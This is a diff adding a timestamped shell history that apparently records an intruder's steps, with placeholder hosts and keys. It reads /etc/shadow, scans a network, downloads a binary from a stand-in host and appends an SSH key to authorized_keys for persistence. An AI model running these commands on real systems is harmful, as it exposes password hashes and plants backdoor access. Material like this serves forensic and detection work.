@@ -1,0 +1,20 @@
+#1760197284
+whoami
+#1760197285
+id
+#1760197286
+sudo -i
+#1760197288
+cat /etc/passwd
+#1760197290
+cat /etc/shadow
+#1760197292
+ss -tulnp
+#1760197294
+nmap -sV 192.0.2.0/24
+#1760197297
+curl -O https://example.invalid/update.bin
+#1760197300
+echo "ssh-rsa EXAMPLE_PUBLIC_KEY" >> ~/.ssh/authorized_keys
+#1760197304
+systemctl status suspicious-monitor.service
